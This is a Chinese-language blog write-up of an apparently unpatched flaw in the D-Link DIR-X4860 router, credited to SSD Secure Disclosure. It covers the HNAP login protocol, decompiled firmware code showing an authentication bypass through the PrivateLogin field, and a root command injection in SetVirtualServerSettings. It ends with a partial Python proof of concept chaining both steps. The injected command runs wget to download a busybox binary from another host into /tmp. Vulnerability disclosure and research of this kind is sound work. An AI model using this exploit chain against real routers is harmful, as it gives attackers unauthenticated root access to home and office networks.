---
title: "DIR-X4860_D-link路由器0day漏洞"
pubDatetime: 2024-05-22T00:00:00Z
description: "此处有崇山峻岭，茂林修竹"
tags: []
---

> D-Link是一家台湾企业，主要产品是交换机、路由器等网络产品，但其产品曝出多个安全漏洞，仅2024.4其NAS产品就曝出了CVE-2024-3272、CVE-2024-3273漏洞。且D-Link对待这些漏洞比较消极。
>
> DIR-X4860 中的安全漏洞允许未经身份验证的远程攻击者访问 HNAP 端口以获得提升的权限，并以`root`身份执行指令。通过将身份验证绕过与命令执行相结合，设备可能会被完全破坏。该漏洞尚未被重视。

**发现者：** SSD Secure Disclosure的安全研究人员

**供应商回应：** 过去一个月中他们已联系供应商3次，但未收到回应。

**受影响版本：** 运行`DIRX4860A1_FWV1.04B03`固件的DIR-x4860

**漏洞成因：** 固件在HNAP协议上对身份验证算法实施的不正确

###### HNAP协议

**Step 1:**发送login请求并等待响应

```
Headers:
"Content-Type": "text/xml; charset=utf-8"
"SOAPAction": "http://purenetworks.com/HNAP1/Login"
<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <Login xmlns="http://purenetworks.com/HNAP1/">
      <Action>request</Action>
      <Username>Admin</Username> //Admin是默认管理员账户
      <LoginPassword/>
      <Captcha/>
    </Login>
  </soap:Body>
</soap:Envelope>
```

响应数据

```
<?xml version="1.0" encoding="UTF-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <LoginResponse xmlns="http://purenetworks.com/HNAP1/">
      <LoginResult>OK</LoginResult>
      <Challenge>........</Challenge>
      <Cookie>........</Cookie>
      <PublicKey>........</PublicKey>
    </LoginResponse>
  </soap:Body>
</soap:Envelope>
```

Cookie项用于填充后续所有HTTP请求，Challenge和PublicKey用于计算HNAP\_AUTH作为HTTP包头的身份验证

```
LoginPassword:
PrivateKey = get_hmac_KEY_md5(PublicKey + password,Challenge)
LoginPassword = get_hmac_KEY_md5(PrivateKey,Challenge)
uid :
uid = Cookie
HNAP_AUTH:
    SOAP_NAMESPACE2 = "http://purenetworks.com/HNAP1/"
    Action = "Login"
    SOAPAction = '"' + SOAP_NAMESPACE2 + Action + '"'
    Time = int(round(time.time() * 1000))
    Time = math.floor(Time) % 2000000000000
    HNAP_AUTH = get_hmac_KEY_md5(PrivateKey,Time + SOAPAction)
```

**Step 2:**发送正式login并等待响应

```
Headers:
"Content-Type": "text/xml; charset=utf-8"
"SOAPAction": "http://purenetworks.com/HNAP1/Login"
"HNAP_AUTH": "........"
"Cookie": "uid=........" //默认填充
<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <Login xmlns="http://purenetworks.com/HNAP1/">
      <Action>login</Action>
      <Username>Admin</Username>
      <LoginPassword>........</LoginPassword>
      <Captcha/>
    </Login>
  </soap:Body>
</soap:Envelope>
```

响应数据

```
<?xml version="1.0" encoding="UTF-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <LoginResponse xmlns="http://purenetworks.com/HNAP1/">
      <LoginResult>success</LoginResult>//success代表成功
    </LoginResponse>
  </soap:Body>
</soap:Envelope>
```

###### 身份漏洞

在`/bin/prog.cgi`文件中发现漏洞

```
int __fastcall sub_5394C(int a1, int a2, int a3, int a4)
{
  int v5; // r1
  char *v6; // r0
  const char *v7; // r5
  const char *v8; // r5
  int v10; // r0
  int v11; // r1
  int v12; // r2
  int v13; // r3
  sub_53074(a1, a2, a3, a4);
  if ( sub_51038(a1) )
  {
    v6 = GetHNAPParam(a1, "/Login/Action");
    v7 = v6;
    if ( v6 )
    {
      if ( !strncmp(v6, "request", 7u) )
      {
        handle_login_request(a1); // into here !!!
        return 1;
      }
      ******
}
int __fastcall handle_login_request(int a1)
{
  char *Username; // r11
  int v3; // r5
  int result; // r0
  const char *PrivateLogin; // [sp+Ch] [bp-84h]
  char s[64]; // [sp+10h] [bp-80h] BYREF
  char v7[64]; // [sp+50h] [bp-40h] BYREF
  char v8[64]; // [sp+90h] [bp+0h] BYREF
  char http_password[64]; // [sp+D0h] [bp+40h] BYREF
  char v10[128]; // [sp+110h] [bp+80h] BYREF
  memset(s, 0, sizeof(s));
  memset(v7, 0, sizeof(v7));
  memset(v8, 0, sizeof(v8));
  memset(http_password, 0, sizeof(http_password));
  memset(v10, 0, sizeof(v10));
  if ( sub_51FE4(a1) )
  {
    sub_5322C(a1, 5);
    result = 0;
  }
  else
  {
    GetHNAPParam(a1, "/Login/Action");
    Username = GetHNAPParam(a1, "/Login/Username");
    GetHNAPParam(a1, "/Login/LoginPassword");
    GetHNAPParam(a1, "/Login/Captcha");
    PrivateLogin = GetHNAPParam(a1, "/Login/PrivateLogin");
    sub_50F98(s, 20);
    sub_50F98(v7, 10);
    sub_50F98(v8, 20);
    if ( PrivateLogin && !strncmp(PrivateLogin, "Username", 8u) )
      strncpy(http_password, Username, 0x40u); // Authentication Bypass!!
    else
      get_http_password(http_password, 0x40u);
    sub_51284(s, http_password, v8, v10, 128);
    v3 = sub_51468(a1, v10, s, v7, v8);
    sub_51094(a1, v7);
    sub_5322C(a1, 0);
    result = v3;
  }
  return result;
}
```

如果包含"PrivateLogin"关键词且与"Username"相同，就会直接将用户名作为密钥验证

这里我们用"Admin"作为密码

```
LoginPassword:
password = ”Admin"
PrivateKey = get_hmac_KEY_md5(PublicKey + password,Challenge)
LoginPassword = get_hmac_KEY_md5(PrivateKey,Challenge)
uid :
uid = Cookie
HNAP_AUTH:
    SOAP_NAMESPACE2 = "http://purenetworks.com/HNAP1/"
    Action = "Login"
    SOAPAction = '"' + SOAP_NAMESPACE2 + Action + '"'
    Time = int(round(time.time() * 1000))
    Time = math.floor(Time) % 2000000000000
    HNAP_AUTH = get_hmac_KEY_md5(PrivateKey,Time + SOAPAction)
```

###### 利用链：

*D-Link DIR-X4860 SetVirtualServerSettings LocalIPAddress Command Injection Remote Code Execution*

`/bin/prog.cgi`中的函数`SetVirtualServerSettings`存在漏洞

```
void __fastcall SetVirtualServerSettings(int a1)
{
      ******
      log_log(7, "SetVirtualServerSettings", 599, "pProtocolNumber=%s\n", v19);
      snprintf(v20, 0x100u, "/SetVirtualServerSettings/VirtualServerList/VirtualServerInfo:%d/%s", v3, "LocalIPAddress");
      LocalIPAddress_v16 = GetHNAPParam(a1, v20);
      if ( !LocalIPAddress_v16 )
      {
        v5 = 604;
        goto LABEL_9;
      }
      log_log(7, "SetVirtualServerSettings", 606, "pLocalIPAddress=%s\n", LocalIPAddress_v16);
      snprintf(v20, 0x100u, "/SetVirtualServerSettings/VirtualServerList/VirtualServerInfo:%d/%s", v3, "ScheduleName");
      v8 = GetHNAPParam(a1, v20);
      if ( !v8 )
      {
        v5 = 611;
        goto LABEL_9;
      }
      if ( !strcmp(s1, "true")
        && !strcmp(v13, "9")
        && !strcmp(v7, "UDP")
        && FCGI_popen_v1(LocalIPAddress_v16, v13, v7, s, ++v14) == -1 ) // into here !!!
      {
        v5 = 620;
        goto LABEL_9;
      }
      ******
}
int __fastcall FCGI_popen_v1(const char *LocalIPAddress, int a2, int a3, char *a4, int a5)
{
  int v7; // r0
  int v8; // r6
  char v10[20]; // [sp+Ch] [bp-14h] BYREF
  char v11[64]; // [sp+20h] [bp+0h] BYREF
  char v12[68]; // [sp+60h] [bp+40h] BYREF
  memset(v11, 0, sizeof(v11));
  memset(v10, 0, 0x12u);
  memset(v12, 0, 0x40u);
  snprintf(v12, 0x40u, "arp | grep %s | awk '{printf $4}'", LocalIPAddress);
  v7 = FCGI_popen(v12, "r"); // rce !!!
  ******
}
```

通过篡改`LocalIPAddress`即可在root上下文执行命令

###### Part of PoC

```
def login_request(ip, port, https):
    """login_result"""
    xml_post = """<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
    <soap:Body>
        <Login xmlns="http://purenetworks.com/HNAP1/">
            <Action>request</Action>
            <Username>Admin</Username>
            <PrivateLogin>Username</PrivateLogin>
            <login_password></login_password>
            <Captcha></Captcha>
        </Login>
    </soap:Body>
</soap:Envelope>"""
    headers = {
        "Host": ip,
        "X-Requested-With": "XMLHttpRequest",
        "SOAPAction": '"http://purenetworks.com/HNAP1/Login"',
        "Content-Type": "text/xml; charset=UTF-8",
    }
    challenge, cookie, public_key, _ = send_http(ip, port, https, headers, xml_post)
    if challenge == b"":
        print("[-] get Challenge error")
        sys.exit(0)
    return challenge, cookie, public_key

def login_login(ip, port, https, login_password, hnap_auth, time_now, cookie):
    """login_login"""
    xml_post = f"""<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
    <soap:Body>
        <Login xmlns="http://purenetworks.com/HNAP1/">
            <Action>login</Action>
            <Username>Admin</Username>
            <LoginPassword>{login_password}</LoginPassword>
            <Captcha></Captcha>
        </Login>
    </soap:Body>
</soap:Envelope>"""
    headers = {
        "Host": ip,
        "X-Requested-With": "XMLHttpRequest",
        "HNAP_AUTH": f"{hnap_auth} {time_now}",
        "SOAPAction": '"http://purenetworks.com/HNAP1/Login"',
        "Content-Type": "text/xml; charset=UTF-8",
        "Cookie": f"uid={cookie}",
    }
    send_http(ip, port, https, headers, xml_post)
def set_virtual_server_settings(ip, port, https, hnap_auth, time_now, cookie, cmd):
    """set_virtual_server_settings"""
    xml_post = f"""<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
    <soap:Body>
        <SetVirtualServerSettings xmlns="http://purenetworks.com/HNAP1/">
            <VirtualServerList>
                <VirtualServerInfo>
                    <Enabled>true</Enabled>
                    <VirtualServerDescription>false</VirtualServerDescription>
                    <ExternalPort>false</ExternalPort>
                    <InternalPort>9</InternalPort>
                    <ProtocolType>UDP</ProtocolType>
                    <ProtocolNumber>UDP</ProtocolNumber>
                    <LocalIPAddress>{cmd}</LocalIPAddress>//将IP替换成注入命令
                    <ScheduleName>false</ScheduleName>
                </VirtualServerInfo>
                <VirtualServerInfo:0>
                    <Enabled>true</Enabled>
                    <VirtualServerDescription>false</VirtualServerDescription>
                    <ExternalPort>false</ExternalPort>
                    <InternalPort>9</InternalPort>
                    <ProtocolType>UDP</ProtocolType>
                    <ProtocolNumber>UDP</ProtocolNumber>
                    <LocalIPAddress>{cmd}</LocalIPAddress>
                    <ScheduleName>false</ScheduleName>
                </VirtualServerInfo:0>
                <VirtualServerInfo:1>
                    <Enabled>true</Enabled>
                    <VirtualServerDescription>false</VirtualServerDescription>
                    <ExternalPort>false</ExternalPort>
                    <InternalPort>9</InternalPort>
                    <ProtocolType>UDP</ProtocolType>
                    <ProtocolNumber>UDP</ProtocolNumber>
                    <LocalIPAddress>{cmd}</LocalIPAddress>
                    <ScheduleName>false</ScheduleName>
                </VirtualServerInfo:1>
            </VirtualServerList>
        </SetVirtualServerSettings>
    </soap:Body>
</soap:Envelope>"""
    headers = {
        "Host": ip,
        "X-Requested-With": "XMLHttpRequest",
        "HNAP_AUTH": f"{hnap_auth} {time_now}",
        "SOAPAction": '"http://purenetworks.com/HNAP1/SetVirtualServerSettings"',
        "Content-Type": "text/xml; charset=UTF-8",
        "Cookie": f"uid={cookie}",
    }
    send_http(ip, port, https, headers, xml_post)
def exploit():
  dummy_password = "Admin"
  private_key = get_hmac_key_md5(public_key + dummy_password, challenge)
  login_password = get_hmac_key_md5(private_key, challenge)
  print(f"[+] login_password : {login_password}")
  soap_namespace2 = "http://purenetworks.com/HNAP1/"
  action = "Login"
  soap_action = f'"{soap_namespace2}{action}"'
  print(f"[+] SOAPAction : {soap_action}")
  time_now = int(round(time.time() * 1000))
  time_now = math.floor(time_now) % 2000000000000
  time_now = "%d" % time_now
  print(f"[+] Time : {time_now}")
  hnap_auth = get_hmac_key_md5(private_key, time_now + soap_action)
  print(f"[+] HNAP_AUTH : {hnap_auth}")
  login_login(
      target_ip, target_port, target_https, login_password, hnap_auth, time_now, cookie
  )
    
  cmd = "1;wget http://192.168.0.100:8000/busybox -O /tmp/tel;AAAAAAAAAAA"
  set_virtual_server_settings(
      target_ip, target_port, target_https, hnap_auth, time_now, cookie, cmd
  )
```

赞赏